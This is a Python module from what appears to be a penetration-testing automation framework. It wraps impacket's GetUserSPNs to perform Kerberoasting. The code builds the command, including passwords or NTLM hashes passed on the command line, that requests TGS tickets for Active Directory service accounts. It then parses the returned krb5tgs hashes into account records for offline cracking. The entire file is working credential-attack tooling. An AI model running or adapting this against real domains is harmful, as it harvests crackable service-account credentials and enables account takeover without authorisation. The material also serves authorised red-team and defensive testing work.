"""GetUserSPNs — impacket Kerberoasting (extract TGS tickets for offline cracking)."""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from ofx.tasks.base import OptDef, Task
from ofx.tasks.output_types import UserAccount
from ofx.tasks.registry import TaskRegistry


@TaskRegistry.register("getuserspns")
class GetUserSPNsTask(Task):
    name = "getuserspns"
    cmd = "impacket-GetUserSPNs"
    description = "Kerberoasting — request TGS tickets for service accounts"
    category = "ad/kerberos"
    install_cmd = "uv tool install impacket"
    output_types = [UserAccount]

    opts = {
        "username": OptDef(flag="-username", type=str, help="Username"),
        "password": OptDef(flag="-password", type=str, help="Password"),
        "hash": OptDef(flag="-hashes", type=str, help="NTLM hashes (LMHASH:NTHASH)"),
        "dc_ip": OptDef(flag="-dc-ip", type=str, help="Domain controller IP"),
        "dc_host": OptDef(flag="-dc-host", type=str, help="Domain controller hostname"),
        "request": OptDef(flag="-request", is_flag=True, help="Request TGS tickets"),
        "request_user": OptDef(flag="-request-user", type=str, help="Request TGS for specific user"),
        "output_file": OptDef(flag="-outputfile", type=str, help="Output file for hashes"),
        "format": OptDef(flag="-outputformat", type=str, help="Output format (hashcat/john)"),
        "k": OptDef(flag="-k", is_flag=True, help="Use Kerberos authentication"),
        "no_pass": OptDef(flag="-no-pass", is_flag=True, help="Don't ask for password"),
        "no_preauth": OptDef(flag="-no-preauth", type=str, help="User without preauth for PKINIT"),
    }

    input_flag = None
    file_flag = None
    output_flag = None
    extra_flags: list[str] = []

    def _output_suffix(self) -> str:
        return ".txt"

    def build_command(self, target: str, **kwargs: Any) -> tuple[str, Path | None]:
        """Build: ``impacket-GetUserSPNs domain/user:pass -dc-ip IP -request``."""
        username = kwargs.pop("username", "")
        password = kwargs.pop("password", "")
        hashes = kwargs.pop("hash", "")

        parts: list[str] = [self.cmd]

        if hashes:
            parts.extend(["-hashes", hashes])

        for key, value in kwargs.items():
            if key.startswith("_"):
                continue
            opt = self.opts.get(key)
            if opt is None:
                continue
            if opt.is_flag:
                if value:
                    parts.append(opt.flag)
            elif value is not None:
                parts.extend([opt.flag, str(value)])

        # Build: domain/user:pass (target is the domain)
        cred = target
        if username:
            cred += f"/{username}"
            if password:
                cred += f":{password}"
        parts.append(cred)

        return " ".join(parts), None

    # ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon  Delegation
    _SPN_RE = re.compile(r"^(\S+)\s+(\S+)\s+(\S*)\s+(\d{4}-\d{2}-\d{2})")
    # $krb5tgs$23$*user$DOMAIN$...
    _HASH_RE = re.compile(r"^\$krb5tgs\$\d+\$\*?(\S+?)\$(\S+?)\$")

    def parse_output(
        self,
        stdout: str,
        stderr: str,
        output_file: Path | None = None,
    ) -> list[UserAccount]:
        raw = ""
        if output_file and output_file.exists():
            raw = self._read_output_file(output_file)
        elif stdout:
            raw = stdout

        raw = raw.strip()
        if not raw:
            return []

        results: list[UserAccount] = []
        seen_users: set[str] = set()

        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue

            # TGS hash line
            m_hash = self._HASH_RE.match(line)
            if m_hash:
                user = m_hash.group(1)
                domain = m_hash.group(2)
                key = f"{domain}\\{user}"
                if key not in seen_users:
                    seen_users.add(key)
                    results.append(
                        UserAccount(
                            username=user,
                            domain=domain,
                            hash=line,
                            source="getuserspns",
                            comment="kerberoastable",
                        )
                    )
                continue

            # SPN table line
            m_spn = self._SPN_RE.match(line)
            if m_spn:
                user = m_spn.group(2)
                if user not in seen_users and user not in ("Name", "-"):
                    seen_users.add(user)
                    results.append(
                        UserAccount(
                            username=user,
                            source="getuserspns",
                            comment=f"SPN:{m_spn.group(1)}",
                        )
                    )

        return results
